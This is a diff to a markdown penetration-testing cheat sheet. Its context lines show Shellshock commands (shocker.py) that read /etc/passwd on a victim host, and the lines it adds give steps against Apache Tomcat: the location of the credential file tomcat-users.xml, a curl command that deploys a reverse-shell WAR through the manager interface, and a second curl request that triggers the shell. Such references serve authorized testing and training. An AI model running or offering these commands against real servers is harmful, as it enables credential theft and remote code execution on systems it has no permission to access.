@@ -114,7 +114,8 @@
   - [Shellshock_via_smb](#smb)
   - [Shellshock tool](#Shellshock_tool)
 - [Apache Tomcat](#Apache-Tomcat)
-  - [](TODO)
+  - [Get tomcat-users.xml](#Get-tomcat-users.xml)
+  - [Upload war file via command line](#Upload-war-file-via-command-line)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -965,4 +966,22 @@ shocker sample:
 ``` 
 python shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
 ```
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Apache Tomcat
 
+## Get tomcat-users.xml
+- /usr/share/tomcat9/etc/tomcat-users.xml
+- 
+
+## Upload war file via commandline
+
+- upload file
+```
+curl -u '<username>':'<userpassword>' -T reverseshell_file.war 'http://<victim_ip>:8080/manager/text/deploy?path=/rev_shell'
+```
+
+- get shell
+```
+curl -u '<username>':'<userpassword>' http://<victim_ip>:8080/rev_shell
+```
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
